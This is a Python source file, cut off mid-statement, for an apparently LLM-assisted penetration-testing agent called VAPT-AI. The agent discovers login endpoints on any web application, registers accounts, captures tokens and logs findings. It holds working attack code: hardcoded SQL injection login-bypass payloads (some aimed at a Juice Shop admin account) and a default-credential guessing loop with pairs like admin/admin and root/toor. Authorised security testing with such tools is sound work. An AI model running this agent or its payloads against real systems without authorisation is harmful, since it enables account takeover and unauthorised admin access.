# agents/v2_auth.py
# VAPT-AI V2.0 - Authentication Agent
# Autonomous agent that discovers auth endpoints, registers, logs in,
# attempts SQLi bypass, common creds, and JWT analysis.
# Works with ANY web app - not hardcoded for Juice Shop.

import asyncio
import json
import random
import string
import time
import base64
import re
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse

from utils.logger import setup_logger
from core.payload_engine import PayloadEngine

logger = setup_logger("v2_auth_agent")


# ──────────────────────────────────────────────
#  Common auth endpoint paths to probe
# ──────────────────────────────────────────────
COMMON_LOGIN_PATHS: List[str] = [
    "/rest/user/login",
    "/api/auth/login",
    "/api/login",
    "/auth/login",
    "/login",
    "/api/v1/auth/login",
    "/api/v1/login",
    "/api/sessions",
    "/api/authenticate",
    "/api/token",
    "/oauth/token",
    "/user/login",
    "/users/login",
    "/accounts/login",
    "/signin",
    "/api/signin",
]

COMMON_REGISTER_PATHS: List[str] = [
    "/api/Users",
    "/api/users",
    "/rest/user/register",
    "/api/auth/register",
    "/api/register",
    "/auth/register",
    "/register",
    "/api/v1/auth/register",
    "/api/v1/register",
    "/api/v1/users",
    "/api/signup",
    "/signup",
    "/user/register",
    "/users/register",
    "/accounts/register",
    "/api/accounts",
]

COMMON_VERIFY_PATHS: List[str] = [
    "/rest/user/whoami",
    "/api/Users/{user_id}",
    "/api/me",
    "/api/profile",
    "/api/v1/me",
    "/api/user/profile",
    "/api/auth/me",
    "/whoami",
    "/api/whoami",
    "/api/v1/profile",
]

# Various JSON body formats web apps commonly accept for registration
REGISTER_BODY_TEMPLATES: List[Dict[str, Any]] = [
    # Juice Shop style
    {
        "email": "{email}",
        "password": "{password}",
        "passwordRepeat": "{password}",
        "securityQuestion": {"id": 1, "question": "Your eldest siblings middle name?"},
        "securityAnswer": "test",
    },
    # Simple email+password
    {"email": "{email}", "password": "{password}"},
    # With confirm
    {"email": "{email}", "password": "{password}", "confirmPassword": "{password}"},
    # Username style
    {"username": "{username}", "email": "{email}", "password": "{password}"},
    # With name
    {
        "name": "{username}",
        "email": "{email}",
        "password": "{password}",
        "password_confirmation": "{password}",
    },
    # Minimal username
    {"username": "{username}", "password": "{password}"},
]

LOGIN_BODY_TEMPLATES: List[Dict[str, Any]] = [
    {"email": "{identifier}", "password": "{password}"},
    {"username": "{identifier}", "password": "{password}"},
    {"user": "{identifier}", "pass": "{password}"},
    {"login": "{identifier}", "password": "{password}"},
    {"email": "{identifier}", "passwd": "{password}"},
    {"identity": "{identifier}", "password": "{password}"},
]


class V2AuthAgent:
    """
    Autonomous Authentication Agent for VAPT-AI V2.0.

    Capabilities:
      1. Discover login / register endpoints (HTTP probing + JS route analysis)
      2. Register a throw-away test account
      3. Login and capture JWT / session tokens
      4. Attempt SQL-injection login bypass for admin access
      5. Attempt default / common credentials
      6. Decode & analyse JWT tokens for vulnerabilities
    """

    def __init__(
        self,
        http_client: Any,
        browser_engine: Any,
        state_manager: Any,
        llm_router: Any,
        payload_engine: Any,
        target_url: str,
    ) -> None:
        self.http = http_client
        self.browser = browser_engine
        self.state = state_manager
        self.llm = llm_router
        self.payloads = payload_engine
        self.target_url = target_url.rstrip("/")

        # Internal tracking
        self._login_endpoint: Optional[str] = None
        self._register_endpoint: Optional[str] = None
        self._login_body_template: Optional[Dict] = None
        self._register_body_template: Optional[Dict] = None

        self._registered_email: Optional[str] = None
        self._registered_password: str = "VAPTtest123!"
        self._registered_username: Optional[str] = None

        self._user_token: Optional[str] = None
        self._admin_token: Optional[str] = None
        self._user_id: Optional[str] = None

        self._results: Dict[str, Any] = {
            "auth_status": "not_started",
            "registered_account": None,
            "tokens": [],
            "sqli_bypass": False,
            "common_creds_bypass": False,
            "findings": [],
            "endpoints_discovered": {"login": None, "register": None},
            "jwt_analysis": [],
        }

    # ═══════════════════════════════════════════════
    #  PUBLIC ENTRY POINT
    # ═══════════════════════════════════════════════

    async def run(self) -> Dict[str, Any]:
        """Execute the full authentication workflow."""
        logger.info("=" * 60)
        logger.info("V2 AUTH AGENT - Starting authentication workflow")
        logger.info(f"Target: {self.target_url}")
        logger.info("=" * 60)

        start_time = time.time()

        try:
            # Step 1 ── Discover auth endpoints
            logger.info("[Step 1/6] Discovering authentication endpoints...")
            await self._discover_auth_endpoints()

            if not self._login_endpoint:
                logger.warning("No login endpoint discovered. Attempting browser-based discovery...")
                await self._discover_via_browser()

            if not self._login_endpoint:
                logger.error("Could not find any login endpoint. Auth agent cannot proceed fully.")
                self._results["auth_status"] = "no_login_endpoint"
            else:
                # Step 2 ── Register a test account
                logger.info("[Step 2/6] Attempting to register a test account...")
                await self._register_test_account()

                # Step 3 ── Login with registered account
                logger.info("[Step 3/6] Attempting login with test credentials...")
                if self._registered_email:
                    await self._login_with_credentials(
                        self._registered_email, self._registered_password
                    )

                # Step 4 ── SQLi login bypass
                logger.info("[Step 4/6] Attempting SQL injection login bypass...")
                await self._attempt_sqli_bypass()

                # Step 5 ── Common / default credentials
                logger.info("[Step 5/6] Attempting common/default credentials...")
                await self._attempt_common_credentials()

            # Step 6 ── JWT analysis (runs even if only partial tokens found)
            logger.info("[Step 6/6] Analysing captured JWT tokens...")
            await self._analyze_all_tokens()

        except Exception as exc:
            logger.error(f"Auth agent encountered an error: {exc}", exc_info=True)
            self._results["error"] = str(exc)

        elapsed = round(time.time() - start_time, 2)
        logger.info(f"Auth agent finished in {elapsed}s")
        self._results["elapsed_seconds"] = elapsed

        # Determine final status
        if self._admin_token:
            self._results["auth_status"] = "admin_access"
        elif self._user_token:
            self._results["auth_status"] = "authenticated"
        elif self._results["auth_status"] == "not_started":
            self._results["auth_status"] = "failed"

        self.state.save_to_disk()
        logger.info(f"Final auth status: {self._results['auth_status']}")
        return self._results

    # ═══════════════════════════════════════════════
    #  STEP 1 ── DISCOVER AUTH ENDPOINTS
    # ═══════════════════════════════════════════════

    async def _discover_auth_endpoints(self) -> None:
        """Probe common paths to find login & register endpoints."""
        logger.info("Probing common login paths...")
        for path in COMMON_LOGIN_PATHS:
            url = urljoin(self.target_url, path)
            try:
                resp = await self.http.get(url)
                self.state.increment_requests()
                if resp.status_code not in (404, 405, 0):
                    logger.info(f"  [HIT] Login candidate: {url} (status={resp.status_code})")
                    self.state.add_endpoint({
                        "url": url,
                        "method": "POST",
                        "source": "auth_discovery",
                        "requires_auth": False,
                        "params": [],
                    })
                    if self._login_endpoint is None:
                        # Also try a POST to confirm it accepts POST
                        post_resp = await self.http.post(url, json={"email": "probe@test.com", "password": "probe"})
                        self.state.increment_requests()
                        if post_resp.status_code not in (404, 405, 0):
                            self._login_endpoint = url
                            logger.info(f"  ✓ Confirmed login endpoint: {url}")
            except Exception as e:
                logger.debug(f"  Error probing {url}: {e}")

        logger.info("Probing common register paths...")
        for path in COMMON_REGISTER_PATHS:
            url = urljoin(self.target_url, path)
            try:
                resp = await self.http.get(url)
                self.state.increment_requests()
                if resp.status_code not in (404, 0):
                    logger.info(f"  [HIT] Register candidate: {url} (status={resp.status_code})")
                    self.state.add_endpoint({
                        "url": url,
                        "method": "POST",
                        "source": "auth_discovery",
                        "requires_auth": False,
                        "params": [],
                    })
                    if self._register_endpoint is None:
                        self._register_endpoint = url
                        logger.info(f"  ✓ Register endpoint: {url}")
            except Exception as e:
                logger.debug(f"  Error probing {url}: {e}")

        # Save to state
        if self._login_endpoint:
            self.state.set_login_endpoint(self._login_endpoint)
            self._results["endpoints_discovered"]["login"] = self._login_endpoint
        if self._register_endpoint:
            self.state.set_register_endpoint(self._register_endpoint)
            self._results["endpoints_discovered"]["register"] = self._register_endpoint

    async def _discover_via_browser(self) -> None:
        """Use headless browser to discover auth endpoints via JS routes and network interception."""
        try:
            logger.info("  Browser-based endpoint discovery starting...")

            # Navigate to target and capture network traffic
            page_data = await self.browser.navigate(self.target_url, wait_for="networkidle")

            # Extract JS routes
            js_routes = await self.browser.extract_js_routes(self.target_url)
            logger.info(f"  Found {len(js_routes)} JS routes")

            for route in js_routes:
                route_path = route.get("path", "")
                lower_path = route_path.lower()
                if any(kw in lower_path for kw in ["login", "signin", "auth", "session", "token"]):
                    candidate_url = urljoin(self.target_url, route_path)
                    if self._login_endpoint is None:
                        self._login_endpoint = candidate_url
                        self.state.set_login_endpoint(candidate_url)
                        self._results["endpoints_discovered"]["login"] = candidate_url
                        logger.info(f"  ✓ Login endpoint from JS: {candidate_url}")

                if any(kw in lower_path for kw in ["register", "signup", "create", "user"]):
                    candidate_url = urljoin(self.target_url, route_path)
                    if self._register_endpoint is None:
                        self._register_endpoint = candidate_url
                        self.state.set_register_endpoint(candidate_url)
                        self._results["endpoints_discovered"]["register"] = candidate_url
                        logger.info(f"  ✓ Register endpoint from JS: {candidate_url}")

            # Check network log for auth-related API calls
            api_calls = self.browser.get_api_calls()
            for call in api_calls:
                call_url = call.url if hasattr(call, "url") else str(call)
                call_lower = call_url.lower()
                if any(kw in call_lower for kw in ["login", "signin", "auth", "token"]):
                    if self._login_endpoint is None:
                        self._login_endpoint = call_url
                        self.state.set_login_endpoint(call_url)
                        self._results["endpoints_discovered"]["login"] = call_url
                        logger.info(f"  ✓ Login endpoint from network: {call_url}")

                if any(kw in call_lower for kw in ["register", "signup", "user"]):
                    if self._register_endpoint is None:
                        self._register_endpoint = call_url
                        self.state.set_register_endpoint(call_url)
                        self._results["endpoints_discovered"]["register"] = call_url
                        logger.info(f"  ✓ Register endpoint from network: {call_url}")

            # Try to discover via page forms
            if page_data and hasattr(page_data, "forms"):
                for form in page_data.forms:
                    form_dict = form.to_dict() if hasattr(form, "to_dict") else form
                    field_names = []
                    if hasattr(form, "get_field_names"):
                        field_names = form.get_field_names()
                    elif isinstance(form_dict, dict):
                        field_names = [f.get("name", "") for f in form_dict.get("fields", [])]

                    lower_fields = [f.lower() for f in field_names]
                    has_password = any("password" in f or "pass" in f for f in lower_fields)
                    has_email = any("email" in f or "user" in f or "login" in f for f in lower_fields)

                    if has_password and has_email:
                        action = form_dict.get("action", "") if isinstance(form_dict, dict) else ""
                        if action:
                            form_url = urljoin(self.target_url, action)
                            if self._login_endpoint is None:
                                self._login_endpoint = form_url
                                self.state.set_login_endpoint(form_url)
                                logger.info(f"  ✓ Login endpoint from form: {form_url}")

        except Exception as e:
            logger.warning(f"  Browser discovery failed: {e}")

    # ═══════════════════════════════════════════════
    #  STEP 2 ── REGISTER A TEST ACCOUNT
    # ═══════════════════════════════════════════════

    async def _register_test_account(self) -> None:
        """Register a test account by trying multiple body formats."""
        if not self._register_endpoint:
            logger.warning("  No register endpoint found – skipping registration.")
            return

        rand_suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
        email = f"vapt.test.{rand_suffix}@test.com"
        username = f"vapttest{rand_suffix}"
        password = self._registered_password

        for idx, template in enumerate(REGISTER_BODY_TEMPLATES):
            body = self._fill_template(template, email=email, username=username, password=password)
            logger.info(f"  Trying register format {idx + 1}/{len(REGISTER_BODY_TEMPLATES)}...")
            logger.debug(f"  Body: {json.dumps(body, default=str)[:200]}")

            try:
                resp = await self.http.post(self._register_endpoint, json=body)
                self.state.increment_requests()
                logger.info(f"  Response: status={resp.status_code}")

                if resp.status_code in (200, 201):
                    logger.info(f"  ✓ Registration SUCCESSFUL with format {idx + 1}")
                    self._registered_email = email
                    self._registered_username = username
                    self._register_body_template = template
                    self._login_body_template = self._guess_login_template(template)

                    # Extract user ID if returned
                    if resp.json_data:
                        data = resp.json_data
                        if isinstance(data, dict):
                            user_data = data.get("data", data)
                            if isinstance(user_data, dict):
                                self._user_id = str(
                                    user_data.get("id", user_data.get("userId", user_data.get("user_id", "")))
                                )

                    # Save to state
                    self.state.add_credential(
                        credential_type="registered",
                        username=email,
                        password=password,
                        source="self_registered",
                        is_admin=False,
                        extra_data={
                            "register_endpoint": self._register_endpoint,
                            "format_index": idx,
                            "username_alias": username,
                            "user_id": self._user_id,
                        },
                    )

                    self._results["registered_account"] = {
                        "email": email,
                        "username": username,
                        "password": password,
                        "user_id": self._user_id,
                    }
                    return  # Success – no need to try more formats

                elif resp.status_code == 400:
                    # Check if "already exists" – if so, try new email
                    resp_text = (resp.text or "").lower()
                    if "already" in resp_text or "exists" in resp_text or "duplicate" in resp_text:
                        logger.info("  User already exists – generating new email...")
                        rand_suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
                        email = f"vapt.test.{rand_suffix}@test.com"
                        username = f"vapttest{rand_suffix}"
                        body = self._fill_template(template, email=email, username=username, password=password)
                        retry_resp = await self.http.post(self._register_endpoint, json=body)
                        self.state.increment_requests()
                        if retry_resp.status_code in (200, 201):
                            logger.info(f"  ✓ Registration SUCCESSFUL on retry")
                            self._registered_email = email
                            self._registered_username = username
                            self._register_body_template = template
                            self._login_body_template = self._guess_login_template(template)

                            if retry_resp.json_data and isinstance(retry_resp.json_data, dict):
                                user_data = retry_resp.json_data.get("data", retry_resp.json_data)
                                if isinstance(user_data, dict):
                                    self._user_id = str(
                                        user_data.get("id", user_data.get("userId", ""))
                                    )

                            self.state.add_credential(
                                credential_type="registered",
                                username=email,
                                password=password,
                                source="self_registered",
                                is_admin=False,
                                extra_data={
                                    "register_endpoint": self._register_endpoint,
                                    "format_index": idx,
                                    "username_alias": username,
                                    "user_id": self._user_id,
                                },
                            )
                            self._results["registered_account"] = {
                                "email": email,
                                "username": username,
                                "password": password,
                                "user_id": self._user_id,
                            }
                            return
                    else:
                        logger.debug(f"  400 response: {resp_text[:200]}")
                else:
                    logger.debug(f"  Status {resp.status_code} – trying next format...")

            except Exception as e:
                logger.debug(f"  Register attempt failed: {e}")

        # If all formats fail, try LLM to figure out correct format
        await self._register_via_llm_analysis(email, username, password)

    async def _register_via_llm_analysis(self, email: str, username: str, password: str) -> None:
        """Ask LLM to analyse register endpoint and suggest correct body format."""
        if not self._register_endpoint:
            return

        try:
            # Try OPTIONS / GET to understand endpoint
            options_resp = await self.http.options(self._register_endpoint)
            self.state.increment_requests()
            get_resp = await self.http.get(self._register_endpoint)
            self.state.increment_requests()

            prompt = f"""I am testing a web application's registration endpoint.
Endpoint: {self._register_endpoint}
OPTIONS response status: {options_resp.status_code}
OPTIONS headers: {dict(options_resp.headers) if hasattr(options_resp, 'headers') else 'N/A'}
GET response status: {get_resp.status_code}
GET response body (first 500 chars): {(get_resp.text or '')[:500]}

What JSON body format does this registration endpoint likely accept?
Reply ONLY with a valid JSON object using these placeholders:
- {{email}} for the email
- {{password}} for the password
- {{username}} for the username
Do not include any explanation, only the JSON object."""

            llm_resp = await self.llm.query(prompt=prompt, task_type="analysis")
            if llm_resp and hasattr(llm_resp, "text") and llm_resp.text:
                llm_text = llm_resp.text.strip()
                # Extract JSON from LLM response
                json_match = re.search(r"\{.*\}", llm_text, re.DOTALL)
                if json_match:
                    suggested_body_str = json_match.group()
                    suggested_body_str = suggested_body_str.replace("{email}", email)
                    suggested_body_str = suggested_body_str.replace("{password}", password)
                    suggested_body_str = suggested_body_str.replace("{username}", username)

                    try:
                        suggested_body = json.loads(suggested_body_str)
                        logger.info(f"  LLM suggested format: {json.dumps(suggested_body)[:200]}")
                        resp = await self.http.post(self._register_endpoint, json=suggested_body)
                        self.state.increment_requests()
                        if resp.status_code in (200, 201):
                            logger.info("  ✓ LLM-suggested registration SUCCEEDED!")
                            self._registered_email = email
                            self._registered_username = username
                            self.state.add_credential(
                                credential_type="registered",
                                username=email,
                                password=password,
                                source="self_registered_llm",
                                is_admin=False,
                                extra_data={"llm_suggested": True},
                            )
                            self._results["registered_account"] = {
                                "email": email,
                                "username": username,
                                "password": password,
                            }
                            return
                    except json.JSONDecodeError:
                        logger.debug("  LLM returned invalid JSON")

        except Exception as e:
            logger.debug(f"  LLM registration analysis failed: {e}")

        logger.warning("  Registration failed with all formats.")

    # ═══════════════════════════════════════════════
    #  STEP 3 ── LOGIN WITH CREDENTIALS
    # ═══════════════════════════════════════════════

    async def _login_with_credentials(self, identifier: str, password: str) -> Optional[str]:
        """
        Try logging in with given credentials.
        Returns the auth token on success, None on failure.
        """
        if not self._login_endpoint:
            logger.warning("  No login endpoint – cannot login.")
            return None

        templates_to_try = []
        if self._login_body_template:
            templates_to_try.append(self._login_body_template)
        templates_to_try.extend(LOGIN_BODY_TEMPLATES)

        for idx, template in enumerate(templates_to_try):
            body = self._fill_login_template(template, identifier=identifier, password=password)
            logger.debug(f"  Login attempt format {idx + 1}: {json.dumps(body)[:150]}")

            try:
                resp = await self.http.post(self._login_endpoint, json=body)
                self.state.increment_requests()

                token = self._extract_token_from_response(resp)

                if resp.status_code == 200 and token:
                    logger.info(f"  ✓ Login SUCCESSFUL! Token captured (len={len(token)})")
                    self._user_token = token
                    self._login_body_template = template

                    # Set token on HTTP client for authenticated requests
                    self.http.set_auth_token(token, token_type="Bearer")

                    # Save to state
                    self.state.add_token({
                        "token_value": token,
                        "token_type": "jwt" if self._looks_like_jwt(token) else "session",
                        "source": "login",
                        "associated_user": identifier,
                        "is_admin": False,
                    })

                    self.state.set_active_session(
                        token=token,
                        session_type="jwt" if self._looks_like_jwt(token) else "cookie",
                    )
                    self.state.set_auth_mechanism("jwt" if self._looks_like_jwt(token) else "session")

                    self._results["tokens"].append({
                        "token": token[:50] + "..." if len(token) > 50 else token,
                        "full_token": token,
                        "type": "user",
                        "source": "login",
                        "user": identifier,
                    })

                    # Verify login by hitting authenticated endpoint
                    verified = await self._verify_authentication(token)
                    if verified:
                        logger.info("  ✓ Authentication verified successfully")
                        self._results["auth_status"] = "authenticated"
                    else:
                        logger.warning("  Token obtained but verification inconclusive")
                        self._results["auth_status"] = "authenticated"

                    return token

                elif resp.status_code == 200 and not token:
                    # Maybe token is in cookies
                    cookies = self.http.get_cookies()
                    if cookies:
                        logger.info(f"  Session cookies captured: {list(cookies.keys())}")
                        self.http.set_cookies(cookies)
                        self.state.set_active_session(token="cookie_based", session_type="cookie")
                        self.state.set_auth_mechanism("cookie")
                        self._user_token = "cookie_based"
                        self._results["auth_status"] = "authenticated"
                        return "cookie_based"

                    # Check if response itself indicates success
                    success = await self._ask_llm_login_success(resp)
                    if success:
                        logger.info("  ✓ Login appears successful (LLM confirmed)")
                        self._results["auth_status"] = "authenticated"
                        return "llm_confirmed"

            except Exception as e:
                logger.debug(f"  Login attempt failed: {e}")

        logger.warning(f"  Login failed for {identifier} with all formats.")
        return None

    async def _verify_authentication(self, token: str) -> bool:
        """Hit common authenticated endpoints to verify the token works."""
        for path_template in COMMON_VERIFY_PATHS:
            path = path_template.replace("{user_id}", self._user_id or "1")
            url = urljoin(self.target_url, path)
            try:
                resp = await self.http.get(url)
                self.state.increment_requests()
                if resp.status_code == 200:
                    logger.info(f"  Verification hit: {url} → 200 OK")
                    return True
                elif resp.status_code == 401 or resp.status_code == 403:
                    logger.debug(f"  {url} → {resp.status_code} (auth required / forbidden)")
            except Exception:
                pass
        return False

    # ═══════════════════════════════════════════════
    #  HELPER ── TOKEN EXTRACTION
    # ═══════════════════════════════════════════════

    def _extract_token_from_response(self, resp: Any) -> Optional[str]:
        """Extract auth token from various response locations."""
        # 1. Use SmartResponse built-in JWT extraction
        jwt_token = resp.extract_jwt_from_response()
        if jwt_token:
            return jwt_token

        # 2. Search JSON body for common token fields
        if resp.json_data and isinstance(resp.json_data, dict):
            token = self._search_dict_for_token(resp.json_data)
            if token:
                return token

        # 3. Check response headers
        auth_header = None
        if hasattr(resp, "headers"):
            auth_header = resp.headers.get("Authorization") or resp.headers.get("authorization")
        if auth_header and " " in auth_header:
            return auth_header.split(" ", 1)[1]

        # 4. Check all tokens extraction
        all_tokens = resp.extract_all_tokens()
        if all_tokens:
            for key in ("jwt", "bearer", "token", "access_token", "auth_token"):
                if all_tokens.get(key):
                    return all_tokens[key]

        return None

    def _search_dict_for_token(self, data: Dict[str, Any], depth: int = 0) -> Optional[str]:
        """Recursively search a dictionary for token-like values."""
        if depth > 5:
            return None

        token_keys = [
            "token", "accessToken", "access_token", "jwt", "auth_token",
            "authToken", "id_token", "idToken", "bearer",
        ]

        for key in token_keys:
            if key in data:
                val = data[key]
                if isinstance(val, str) and len(val) > 20:
                    return val

        # Check nested objects
        nested_keys = ["authentication", "auth", "data", "result", "user", "session", "response"]
        for key in nested_keys:
            if key in data and isinstance(data[key], dict):
                found = self._search_dict_for_token(data[key], depth + 1)
                if found:
                    return found

        return None

    @staticmethod
    def _looks_like_jwt(token: str) -> bool:
        """Quick check if a token looks like a JWT."""
        if not token or token == "cookie_based":
            return False
        parts = token.split(".")
        if len(parts) != 3:
            return False
        try:
            # Try base64-decoding the header
            header_b64 = parts[0] + "=" * (4 - len(parts[0]) % 4)
            header_json = base64.urlsafe_b64decode(header_b64)
            header = json.loads(header_json)
            return "alg" in header or "typ" in header
        except Exception:
            return len(parts[0]) > 10 and len(parts[1]) > 10

    # ═══════════════════════════════════════════════
    #  HELPER ── TEMPLATE FILLING
    # ═══════════════════════════════════════════════

    def _fill_template(
        self, template: Dict[str, Any], email: str, username: str, password: str
    ) -> Dict[str, Any]:
        """Fill a registration body template with actual values."""
        result: Dict[str, Any] = {}
        for key, value in template.items():
            if isinstance(value, str):
                filled = (
                    value
                    .replace("{email}", email)
                    .replace("{username}", username)
                    .replace("{password}", password)
                )
                result[key] = filled
            elif isinstance(value, dict):
                result[key] = self._fill_template(value, email, username, password)
            else:
                result[key] = value
        return result

    def _fill_login_template(
        self, template: Dict[str, Any], identifier: str, password: str
    ) -> Dict[str, Any]:
        """Fill a login body template."""
        result: Dict[str, Any] = {}
        for key, value in template.items():
            if isinstance(value, str):
                filled = value.replace("{identifier}", identifier).replace("{password}", password)
                result[key] = filled
            else:
                result[key] = value
        return result

    def _guess_login_template(self, register_template: Dict[str, Any]) -> Dict[str, Any]:
        """Guess the login template based on the working register template."""
        if "email" in register_template:
            return {"email": "{identifier}", "password": "{password}"}
        elif "username" in register_template:
            return {"username": "{identifier}", "password": "{password}"}
        return {"email": "{identifier}", "password": "{password}"}

    async def _ask_llm_login_success(self, resp: Any) -> bool:
        """Ask LLM to determine if a login response indicates success."""
        try:
            body_preview = (resp.text or "")[:500]
            prompt = f"""Analyse this HTTP response from a login endpoint.
Status code: {resp.status_code}
Response body (first 500 chars):
{body_preview}

Does this response indicate a SUCCESSFUL login?
Reply with exactly "YES" or "NO" followed by a brief reason."""

            llm_resp = await self.llm.query(prompt=prompt, task_type="analysis")
            if llm_resp and hasattr(llm_resp, "text") and llm_resp.text:
                answer = llm_resp.text.strip().upper()
                return answer.startswith("YES")
        except Exception:
            pass
        return False
    
        # ═══════════════════════════════════════════════
    #  STEP 4 ── SQL INJECTION LOGIN BYPASS
    # ═══════════════════════════════════════════════

    async def _attempt_sqli_bypass(self) -> None:
        """Try SQL injection payloads on the login endpoint to bypass authentication."""
        if not self._login_endpoint:
            logger.warning("  No login endpoint – skipping SQLi bypass.")
            return

        logger.info("  Starting SQLi login bypass attempts...")

        # ── Phase A: Manual high-priority SQLi payloads ──
        manual_sqli_payloads: List[Dict[str, str]] = [
            {"email": "' OR 1=1--", "password": "anything"},
            {"email": "' OR 1=1 --", "password": "anything"},
            {"email": "admin'--", "password": "anything"},
            {"email": "' OR '1'='1'--", "password": "anything"},
            {"email": "' OR '1'='1' --", "password": "anything"},
            {"email": "admin@juice-sh.op'--", "password": "anything"},
            {"email": "' OR 1=1 --", "password": "' OR 1=1 --"},
            {"email": "admin' OR '1'='1", "password": "admin' OR '1'='1"},
            {"email": "' OR ''='", "password": "' OR ''='"},
            {"email": "1' OR '1'='1'/*", "password": "anything"},
            {"email": "' UNION SELECT * FROM Users--", "password": "anything"},
            {"email": "admin'/*", "password": "anything"},
            {"email": "' OR 1=1#", "password": "anything"},
            {"email": "' OR 1=1/*", "password": "anything"},
            {"email": "') OR ('1'='1", "password": "anything"},
            {"email": "') OR ('1'='1'--", "password": "anything"},
        ]

        sqli_success = False
        successful_payload = None

        for idx, payload_pair in enumerate(manual_sqli_payloads):
            if sqli_success:
                break

            sqli_email = payload_pair["email"]
            sqli_pass = payload_pair["password"]

            logger.info(f"  SQLi attempt {idx + 1}/{len(manual_sqli_payloads)}: email={sqli_email[:40]}")

            result = await self._try_single_login(sqli_email, sqli_pass, source="sqli_manual")
            if result and result.get("success"):
                sqli_success = True
                successful_payload = payload_pair
                logger.info(f"  ✓✓✓ SQLi LOGIN BYPASS SUCCESSFUL! Payload: {sqli_email}")
                break

            # Small delay to avoid rate limiting
            await asyncio.sleep(0.3)

        # ── Phase B: PayloadEngine login payloads ──
        if not sqli_success:
            logger.info("  Manual SQLi failed. Trying PayloadEngine login payloads...")
            try:
                engine_payloads = self.payloads.get_login_payloads(
                    context={"target_url": self.target_url}
                )
                # Limit to top 20 to avoid excessive requests
                engine_payloads = engine_payloads[:20]

                for idx, p in enumerate(engine_payloads):
                    if sqli_success:
                        break

                    p_value = p.get("value", p.get("payload", ""))
                    if not p_value:
                        continue

                    logger.info(f"  Engine SQLi {idx + 1}/{len(engine_payloads)}: {p_value[:40]}")

                    result = await self._try_single_login(
                        p_value, "anything", source="sqli_engine"
                    )
                    if result and result.get("success"):
                        sqli_success = True
                        successful_payload = {"email": p_value, "password": "anything", "engine_payload": p}
                        logger.info(f"  ✓✓✓ SQLi LOGIN BYPASS (engine payload) SUCCESSFUL!")
                        break

                    await asyncio.sleep(0.3)

            except Exception as e:
                logger.debug(f"  PayloadEngine login payloads error: {e}")

        # ── Phase C: Try SQLi in password field too ──
        if not sqli_success:
            logger.info("  Trying SQLi in password field...")
            password_sqli_payloads = [
                {"email": "admin@juice-sh.op", "password": "' OR 1=1--"},
                {"email": "admin@juice-sh.op", "password": "' OR '1'='1'--"},
                {"email": "admin", "password": "' OR 1=1--"},
                {"email": "admin", "password": "' OR '1'='1"},
                {"email": "test@test.com", "password": "' OR 1=1--"},
            ]

            for idx, payload_pair in enumerate(password_sqli_payloads):
                if sqli_success:
                    break

                logger.info(f"  Password SQLi {idx + 1}/{len(password_sqli_payloads)}: pass={payload_pair['password'][:30]}")

                result = await self._try_single_login(
                    payload_pair["email"], payload_pair["password"], source="sqli_password"
                )
                if result and result.get("success"):
                    sqli_success = True
                    successful_payload = payload_pair
                    logger.info(f"  ✓✓✓ Password field SQLi BYPASS SUCCESSFUL!")
                    break

                await asyncio.sleep(0.3)

        # ── Record results ──
        if sqli_success:
            self._results["sqli_bypass"] = True

            # Record as critical finding
            self.state.add_finding(
                finding_type="confirmed",
                category="sqli",
                severity="critical",
                title="SQL Injection Authentication Bypass",
                description=f"Login endpoint {self._login_endpoint} is vulnerable to SQL injection. "
                            f"Successful payload: {json.dumps(successful_payload, default=str)[:300]}",
                endpoint=self._login_endpoint,
                evidence={
                    "payload": successful_payload,
                    "endpoint": self._login_endpoint,
                    "impact": "Complete authentication bypass - attacker can login as any user",
                },
                remediation="Use parameterized queries / prepared statements for all database operations. "
                            "Never concatenate user input into SQL queries.",
            )

            # Add to attack chain
            self.state.add_to_attack_chain(
                step_name="SQLi Login Bypass",
                description=f"Bypassed authentication via SQL injection on {self._login_endpoint}",
                result="Admin token obtained" if self._admin_token else "User token obtained",
                data_obtained={
                    "token": (self._admin_token or self._user_token or "")[:50],
                    "payload": str(successful_payload)[:200],
                },
            )

            logger.info("  SQLi bypass recorded as CRITICAL finding.")
        else:
            logger.info("  No SQLi bypass found on login endpoint.")

    # ═══════════════════════════════════════════════
    #  STEP 5 ── COMMON / DEFAULT CREDENTIALS
    # ═══════════════════════════════════════════════

    async def _attempt_common_credentials(self) -> None:
        """Try default / well-known credentials on the login endpoint."""
        if not self._login_endpoint:
            logger.warning("  No login endpoint – skipping common credentials.")
            return

        # Skip if we already have admin access
        if self._admin_token:
            logger.info("  Already have admin access – skipping common creds.")
            return

        logger.info("  Trying common/default credentials...")

        # ── Phase A: Manual common credentials ──
        manual_creds: List[Tuple[str, str]] = [
            ("admin@juice-sh.op", "admin123"),
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "admin123"),
            ("admin", "123456"),
            ("administrator", "administrator"),
            ("administrator", "password"),
            ("admin@admin.com", "admin"),
            ("admin@admin.com", "admin123"),
            ("admin@admin.com", "password"),
            ("root", "root"),
            ("root", "toor"),
            ("test", "test"),
            ("user", "user"),
            ("demo", "demo"),
            ("guest", "guest"),
        ]

        cred_success = False
        successful_cred = None

        for idx, (user, passwd) in enumerate(manual_creds):
            if cred_success:
                break

            logger.info(f"  Cred attempt {idx + 1}/{len(manual_creds)}: {user} / {'*' * len(passwd)}")

            result = await self._try_single_login(user, passwd, source="common_creds")
            if result and result.get("success"):
                cred_success = True
                successful_cred = (user, passwd)
                logger.info(f"  ✓ Common credential login SUCCESSFUL: {user}")
                break

            await asyncio.sleep(0.3)

        # ── Phase B: PayloadEngine default credentials ──
        if not cred_success:
            logger.info("  Trying PayloadEngine default credentials...")
            try:
                default_creds = self.payloads.get_default_credentials()
                # Limit to avoid excessive requests
                default_creds = default_creds[:15]

                for idx, (user, passwd) in enumerate(default_creds):
                    if cred_success:
                        break

                    # Skip if already tried in manual list
                    if (user, passwd) in manual_creds:
                        continue

                    logger.info(f"  Engine cred {idx + 1}/{len(default_creds)}: {user}")

                    result = await self._try_single_login(user, passwd, source="default_creds_engine")
                    if result and result.get("success"):
                        cred_success = True
                        successful_cred = (user, passwd)
                        logger.info(f"  ✓ Default credential login SUCCESSFUL: {user}")
                        break

                    await asyncio.sleep(0.3)

            except Exception as e:
                logger.debug(f"  PayloadEngine default creds error: {e}")

        # ── Record results ──
        if cred_success and successful_cred:
            self._results["common_creds_bypass"] = True

            self.state.add_finding(
                finding_type="confirmed",
                category="auth_bypass",
                severity="high",
                title="Default/Weak Credentials Found",
                description=f"Login endpoint {self._login_endpoint} accepts default/weak credentials. "
                            f"Username: {successful_cred[0]}",
                endpoint=self._login_endpoint,
                evidence={
